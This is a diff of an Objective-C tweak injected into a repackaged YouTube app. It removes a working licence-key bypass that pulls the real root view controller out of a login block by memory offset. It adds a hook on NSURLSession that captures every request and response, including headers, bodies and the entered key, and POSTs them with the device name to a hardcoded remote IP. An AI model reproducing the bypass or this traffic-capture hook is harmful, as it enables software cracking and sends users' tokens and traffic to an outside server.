@@ -1,15 +1,18 @@
-// YouTube (亚马逊/TrollStore 版) 去授权 hook + 远程崩溃日志
+// YouTube (亚马逊/TrollStore 版) —— 网络抓包诊断版 (Path B 验证)
 //
-// 授权逻辑(逆向): 启动时 rootVC = 注入的 LoginViewController(卡密界面)，
-//   验证通过后 [self onAuthorized]() (ivar _onAuthorized, @?, +0x10) 才进真正的 YouTube。
-// 去授权: 在 viewDidAppear: 之后取出 _onAuthorized block 直接执行放行；短路 submitTapped。
+// 目的: 作者已停发卡密。验证猜想"服务器根本不验卡密、直接下发 payload"。
+//   submitTapped 只本地校验卡密长度==32，真正判定在服务器 (sub_1001D1478 走
+//   NSURLSession POST)。所以输入任意 32 位字符提交，即可触发真实请求。
 //
-// 崩溃诊断(设备"分析与数据"看不到崩溃日志时用):
-//   - 全程日志落盘到 App 沙盒 tmp/ytunlock.log
-//   - %ctor 首先安装 NSUncaughtExceptionHandler + signal handler(SIGSEGV/ABRT/BUS/ILL/TRAP)
-//     崩溃时把信号+backtrace 追加到日志
-//   - 每次启动先把"上一会话"的完整日志(含上次崩溃栈) POST 到远程服务器
-//     这样即使每次一开就崩，重开时也能把上次崩溃原因发出来
+// 本版行为:
+//   1. 【不自动跳过登录】—— 停在卡密界面，让你手动输 32 位任意卡密并提交。
+//   2. 【不 hook submitTapped】—— 让真实验证网络请求正常发出。
+//   3. 【hook NSURLSession dataTaskWithRequest:completionHandler:】—— 把
+//      真实 URL、方法、请求头、请求体(卡密)、响应状态码、响应数据(hex+utf8)
+//      全部落盘 + 上传到你的服务器，用来判断服务器是否下发 payload。
+//
+// 去授权版备份见 Tweak_deauth_working.xm.bak。
+// 崩溃捕获/日志/上报基础设施沿用去授权版。
 
 #import <UIKit/UIKit.h>
 #import <objc/runtime.h>
@@ -21,8 +24,9 @@
 #import <unistd.h>
 #import <string.h>
 
-// ====== 配置: 崩溃日志上报地址(改成你的服务器) ======
+// ====== 配置: 日志/抓包上报地址 ======
 #define REPORT_URL @"http://159.75.14.193:8099/report"
+#define REPORT_HOST_PREFIX @"http://159.75.14.193:8099"
 
 // ====== 日志文件路径 ======
 static NSString *logPath(void) {
@@ -32,7 +36,6 @@ static NSString *prevLogPath(void) {
     return [NSTemporaryDirectory() stringByAppendingPathComponent:@"ytunlock.prev.log"];
 }
 
-// 低层追加写(信号处理里也可用: 只用 write/open，不用 OC)
 static void rawAppend(const char *line) {
     @try {
         NSString *p = logPath();
@@ -49,7 +52,7 @@ static void YLOGf(NSString *fmt, ...) {
     va_list ap; va_start(ap, fmt);
     NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
     va_end(ap);
-    NSString *line = [NSString stringWithFormat:@"[YTUnlock] %@", s];
+    NSString *line = [NSString stringWithFormat:@"[YTNet] %@", s];
     NSLog(@"%@", line);
     rawAppend([line UTF8String]);
 }
@@ -68,7 +71,6 @@ static void writeBacktrace(const char *reason) {
     }
     rawAppend("========== END CRASH ==========");
 }
-
 static void sigHandler(int sig) {
     char buf[64];
     snprintf(buf, sizeof(buf), "FATAL SIGNAL %d", sig);
@@ -76,7 +78,6 @@ static void sigHandler(int sig) {
     signal(sig, SIG_DFL);
     raise(sig);
 }
-
 static void excHandler(NSException *e) {
     @try {
         NSString *r = [NSString stringWithFormat:@"NSException: %@ | %@\n%@",
@@ -86,7 +87,6 @@ static void excHandler(NSException *e) {
         rawAppend("========== END NSEXCEPTION ==========");
     } @catch (__unused id x) {}
 }
-
 static void installCrashHandlers(void) {
     NSSetUncaughtExceptionHandler(&excHandler);
     int sigs[] = {SIGSEGV, SIGABRT, SIGBUS, SIGILL, SIGTRAP, SIGFPE};
@@ -114,11 +114,29 @@ static void reportFile(NSString *path, NSString *tag) {
             }];
         [t resume];
     } @catch (id e) {
-        NSLog(@"[YTUnlock] reportFile exception %@", e);
+        NSLog(@"[YTNet] reportFile exception %@", e);
     }
 }
 
-// 启动时: 轮转日志(上次的存 prev)，并把上次的发出去
+// 直接上报一段字符串(不落盘也发)，tag 区分。用 ephemeral session 避免被我们自己 hook 再触发。
+static void reportString(NSString *body, NSString *tag) {
+    @try {
+        NSData *data = [body dataUsingEncoding:NSUTF8StringEncoding];
+        if (!data) return;
+        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:REPORT_URL]];
+        req.HTTPMethod = @"POST";
+        req.HTTPBody = data;
+        [req setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
+        NSString *dev = [[UIDevice currentDevice] name];
+        NSString *sys = [[UIDevice currentDevice] systemVersion];
+        [req setValue:[NSString stringWithFormat:@"%@-%@", dev, sys] forHTTPHeaderField:@"X-Device"];
+        [req setValue:tag forHTTPHeaderField:@"X-Tag"];
+        NSURLSession *s = [NSURLSession sessionWithConfiguration:
+                           [NSURLSessionConfiguration ephemeralSessionConfiguration]];
+        [[s dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *err) {}] resume];
+    } @catch (__unused id e) {}
+}
+
 static void rotateAndReportPrevious(void) {
     @try {
         NSFileManager *fm = [NSFileManager defaultManager];
@@ -127,163 +145,124 @@ static void rotateAndReportPrevious(void) {
             [fm removeItemAtPath:prev error:nil];
             [fm moveItemAtPath:cur toPath:prev error:nil];
         }
-        // 新会话开始
         rawAppend("");
-        YLOG(@"==== new session %@ ====", [NSDate date]);
-        // 把上次会话(可能含崩溃栈)发出去
+        YLOG(@"==== new session %@ (NET-CAPTURE build) ====", [NSDate date]);
         if ([fm fileExistsAtPath:prev]) reportFile(prev, @"prev-session");
     } @catch (__unused id e) {}
 }
 
-// ====== 去授权 ======
-typedef void (^AuthBlock)(void);
-
-static BOOL claimFireOnce(id vc) {
-    static const void *KEY = &KEY;
-    if (objc_getAssociatedObject(vc, KEY)) return NO;
-    objc_setAssociatedObject(vc, KEY, @YES, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
-    return YES;
+// ====== 抓包工具: 把 NSData dump 成 hex + 尝试 utf8 ======
+static NSString *dumpData(NSData *d, NSUInteger maxBytes) {
+    if (!d) return @"(nil)";
+    NSUInteger n = d.length;
+    NSUInteger show = n < maxBytes ? n : maxBytes;
+    const unsigned char *b = (const unsigned char *)d.bytes;
+    NSMutableString *hex = [NSMutableString stringWithCapacity:show * 3];
+    for (NSUInteger i = 0; i < show; i++) [hex appendFormat:@"%02x", b[i]];
+    NSString *utf8 = [[NSString alloc] initWithData:[d subdataWithRange:NSMakeRange(0, show)]
+                                           encoding:NSUTF8StringEncoding];
+    return [NSString stringWithFormat:@"len=%lu%@\n  hex: %@\n  utf8: %@",
+            (unsigned long)n, (n > show ? @"(truncated)" : @""), hex,
+            utf8 ? utf8 : @"(non-utf8)"];
 }
 
-// 从 LoginVC 上找到当前 window（优先 self.view.window，退回 scene/app keyWindow）
-static UIWindow *findWindow(id vc) {
+static NSString *describeRequest(NSURLRequest *req) {
+    NSMutableString *s = [NSMutableString string];
     @try {
-        UIView *v = [vc valueForKey:@"view"];
-        UIWindow *w = v ? v.window : nil;
-        if (w) return w;
-    } @catch (__unused id e) {}
-    // 退回：遍历所有 window，取第一个 keyWindow / 可见的
-    @try {
-        for (UIWindow *w in [UIApplication sharedApplication].windows) {
-            if (w.isKeyWindow) return w;
-        }
-        UIWindow *any = [UIApplication sharedApplication].windows.firstObject;
-        if (any) return any;
-    } @catch (__unused id e) {}
-    return nil;
+        [s appendFormat:@"URL: %@\n", req.URL.absoluteString ?: @"(nil)"];
+        [s appendFormat:@"Method: %@\n", req.HTTPMethod ?: @"(nil)"];
+        [s appendFormat:@"Timeout: %.1f\n", req.timeoutInterval];
+        NSDictionary *h = req.allHTTPHeaderFields;
+        [s appendFormat:@"Headers(%lu):\n", (unsigned long)h.count];
+        for (NSString *k in h) [s appendFormat:@"  %@: %@\n", k, h[k]];
+        NSData *body = req.HTTPBody;
+        [s appendFormat:@"Body: %@\n", dumpData(body, 4096)];
+    } @catch (id e) { [s appendFormat:@"(describeRequest exc %@)\n", e]; }
+    return s;
 }
 
-// 不再调用 onAuthorized block（其头部有完整性 guard，直接调会被系统打掉）。
-// 改为：从 block 对象里把它捕获的"真·YouTube 根 VC"(偏移 +0x28) 抠出来，
-// 自己做 setRootViewController，完全绕开那段 guard。
-static void fireUnlock(id vc) {
-    if (![NSThread isMainThread]) {
-        dispatch_async(dispatch_get_main_queue(), ^{ fireUnlock(vc); });
-        return;
-    }
-    @try {
-        if (!vc) return;
-        Ivar iv = class_getInstanceVariable(object_getClass(vc), "_onAuthorized");
-        id blockObj = iv ? object_getIvar(vc, iv) : nil;
-        if (!blockObj) { @try { blockObj = [vc valueForKey:@"onAuthorized"]; } @catch (__unused id e) {} }
-        if (!blockObj) { YLOG(@"onAuthorized not ready"); return; }
+// ====== hook NSURLSession dataTaskWithRequest:completionHandler: ======
+// 真正实现常在私有子类 __NSURLSessionLocal 上，逐候选类 hook。
+typedef NSURLSessionDataTask * (*DataTaskIMP)(id, SEL, NSURLRequest *,
+        void (^)(NSData *, NSURLResponse *, NSError *));
 
-        // block 内存布局(反汇编确认): +0x00 isa | +0x08 flags | +0x10 invoke | +0x18 desc
-        //   +0x20 = window(弱引用)  | +0x28 = rootVC(强引用, AppViewController)
-        // nested block: ldp x0,x2,[x0,#0x20] -> setRootViewController: → 窗口在+0x20,VC在+0x28
-        // 不做 isKindOfClass 判定（AppViewController 可能不走标准继承链，判定会误伤），直接按偏移用。
-        void * const *layout = (void * const *)(__bridge const void *)blockObj;
-        id cap20 = (__bridge id)layout[4];   // +0x20 window
-        id cap28 = (__bridge id)layout[5];   // +0x28 rootVC
+static NSMutableSet *gHooked = nil;
 
-        YLOG(@"block caps: +0x20=%@  +0x28=%@",
-             cap20 ? NSStringFromClass(object_getClass(cap20)) : @"nil",
-             cap28 ? NSStringFromClass(object_getClass(cap28)) : @"nil");
-
-        // IDA 确认: block 里 +0x28 存的是 AppViewController "类对象"，block 会先
-        //   objc_alloc_init 把它实例化，再把实例装进 window。
-        //   之前直接把类当 rootVC → UIKit 一路发实例消息 unrecognized selector。
-        //   这里复刻: 若 cap28 是类，就 [[cls alloc] init] 造实例。
-        UIViewController *rootVC = nil;
-        if (class_isMetaClass(object_getClass(cap28))) {
-            Class cls = (Class)cap28;                 // cap28 本身就是类对象
-            YLOG(@"cap28 is Class %s -> alloc/init instance", class_getName(cls));
-            @try {
-                rootVC = [[cls alloc] init];          // 复刻 objc_alloc_init
-            } @catch (id e) { YLOG(@"alloc/init exception: %@", e); }
-        } else {
-            rootVC = cap28;                           // 已是实例
-        }
-
-        UIWindow *win = nil;
-        if ([cap20 isKindOfClass:[UIWindow class]]) win = cap20;   // +0x20 优先
-        if (!win) win = findWindow(vc);                            // 退回 self.view.window
-        if (!win && [cap20 respondsToSelector:@selector(setRootViewController:)]) win = cap20;
-
-        if (!rootVC) { YLOG(@"rootVC build failed, abort"); return; }
-        if (!win)    { YLOG(@"window not found, abort"); return; }
-
-        YLOG(@"manual unlock: setRootViewController:%@ on %@",
-             NSStringFromClass(object_getClass(rootVC)), NSStringFromClass(object_getClass(win)));
-        [UIView transitionWithView:win
-                          duration:0.3
-                           options:UIViewAnimationOptionTransitionCrossDissolve
-                        animations:^{ win.rootViewController = rootVC; }
-                        completion:^(BOOL fin){ YLOG(@"manual unlock done fin=%d", fin); }];
-        YLOG(@"manual unlock issued OK");
-    } @catch (id e) {
-        YLOG(@"fireUnlock exception: %@", e);
-    }
-}
-
-static void patchClass(Class cls) {
+static void hookDataTaskOnClass(Class cls) {
     if (!cls) return;
-    YLOG(@"patching %s", class_getName(cls));
-    {
-        SEL sel = @selector(viewDidAppear:);
-        Method m = class_getInstanceMethod(cls, sel);
-        if (m) {
-            IMP orig = method_getImplementation(m);
-            IMP repl = imp_implementationWithBlock(^(id self_, BOOL animated) {
-                ((void(*)(id, SEL, BOOL))orig)(self_, sel, animated);
-                if (claimFireOnce(self_)) {
-                    YLOG(@"LoginVC appeared, will unlock after settle");
-                    // 等 viewDidAppear 转场动画彻底结束再触发，避免转场重入导致栈破坏
-                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)),
-                                   dispatch_get_main_queue(), ^{
-                        YLOG(@"settle done, firing unlock now");
-                        fireUnlock(self_);
-                    });
+    SEL sel = @selector(dataTaskWithRequest:completionHandler:);
+    Method m = class_getInstanceMethod(cls, sel);
+    if (!m) return;
+    if (!gHooked) gHooked = [NSMutableSet set];
+    NSString *tag = NSStringFromClass(cls);
+    if ([gHooked containsObject:tag]) return;
+    [gHooked addObject:tag];
+
+    DataTaskIMP orig = (DataTaskIMP)method_getImplementation(m);
+    IMP repl = imp_implementationWithBlock(^NSURLSessionDataTask *(id self_,
+            NSURLRequest *req, void (^ch)(NSData *, NSURLResponse *, NSError *)) {
+        NSString *url = req.URL.absoluteString ?: @"";
+        BOOL isSelfReport = [url hasPrefix:REPORT_HOST_PREFIX];
+        if (!isSelfReport) {
+            NSString *desc = describeRequest(req);
+            YLOG(@"==> REQUEST (%@)\n%@", tag, desc);
+            reportString([NSString stringWithFormat:@"==> REQUEST (%@)\n%@", tag, desc], @"net-req");
+        }
+        void (^wrapped)(NSData *, NSURLResponse *, NSError *) =
+            ^(NSData *data, NSURLResponse *resp, NSError *err) {
+                if (!isSelfReport) {
+                    @try {
+                        long code = -1;
+                        NSString *rhdr = @"";
+                        if ([resp isKindOfClass:[NSHTTPURLResponse class]]) {
+                            NSHTTPURLResponse *hr = (NSHTTPURLResponse *)resp;
+                            code = (long)hr.statusCode;
+                            NSMutableString *hs = [NSMutableString string];
+                            for (id k in hr.allHeaderFields) [hs appendFormat:@"  %@: %@\n", k, hr.allHeaderFields[k]];
+                            rhdr = hs;
+                        }
+                        NSString *rep = [NSString stringWithFormat:
+                            @"<== RESPONSE url=%@\n  status=%ld err=%@\n  respHeaders:\n%@  body: %@",
+                            url, code, err ? err.localizedDescription : @"(none)",
+                            rhdr, dumpData(data, 8192)];
+                        YLOG(@"%@", rep);
+                        reportString(rep, @"net-resp");
+                    } @catch (__unused id e) {}
                 }
-            });
-            method_setImplementation(m, repl);
-            YLOG(@"hooked viewDidAppear:");
-        } else {
-            YLOG(@"no viewDidAppear:");
-        }
-    }
-    {
-        SEL sel = @selector(submitTapped);
-        Method m = class_getInstanceMethod(cls, sel);
-        if (m) {
-            IMP repl = imp_implementationWithBlock(^(id self_) {
-                YLOG(@"submitTapped -> direct unlock");
-                fireUnlock(self_);
-            });
-            method_setImplementation(m, repl);
-            YLOG(@"hooked submitTapped");
-        }
-    }
+                if (ch) ch(data, resp, err);
+            };
+        return orig(self_, sel, req, ch ? wrapped : ch);
+    });
+    method_setImplementation(m, repl);
+    YLOG(@"hooked dataTaskWithRequest:completionHandler: on %@", tag);
+}
+
+static void installNetworkHooks(void) {
+    const char *names[] = {
+        "__NSURLSessionLocal", "__NSCFURLSession", "NSURLSession", NULL
+    };
+    for (int i = 0; names[i]; i++) hookDataTaskOnClass(objc_getClass(names[i]));
+    @try {
+        NSURLSession *s = [NSURLSession sessionWithConfiguration:
+                           [NSURLSessionConfiguration defaultSessionConfiguration]];
+        hookDataTaskOnClass(object_getClass(s));
+        NSURLSession *sh = [NSURLSession sharedSession];
+        hookDataTaskOnClass(object_getClass(sh));
+    } @catch (__unused id e) {}
 }
 
 %ctor {
-    // 崩溃捕获必须最先装(才能抓到后续任何崩溃)
     installCrashHandlers();
     rotateAndReportPrevious();
     @try {
-        YLOG(@"ctor start");
-        Class c = objc_getClass("LoginViewController");
-        if (c) { patchClass(c); YLOG(@"ctor done (direct)"); return; }
-
-        YLOG(@"LoginViewController missing at ctor, defer to main queue");
-        dispatch_async(dispatch_get_main_queue(), ^{
-            @try {
-                Class c2 = objc_getClass("LoginViewController");
-                if (c2) patchClass(c2);
-                else YLOG(@"LoginViewController still missing");
-            } @catch (id e) { YLOG(@"deferred exception: %@", e); }
+        YLOG(@"ctor start (NET-CAPTURE, no auto-skip login)");
+        installNetworkHooks();
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
+                       dispatch_get_main_queue(), ^{
+            installNetworkHooks();
+            YLOG(@"late network hook pass done");
         });
-        YLOG(@"ctor done (deferred)");
+        YLOG(@"ctor done");
     } @catch (id e) {
         YLOG(@"ctor exception: %@", e);
     }
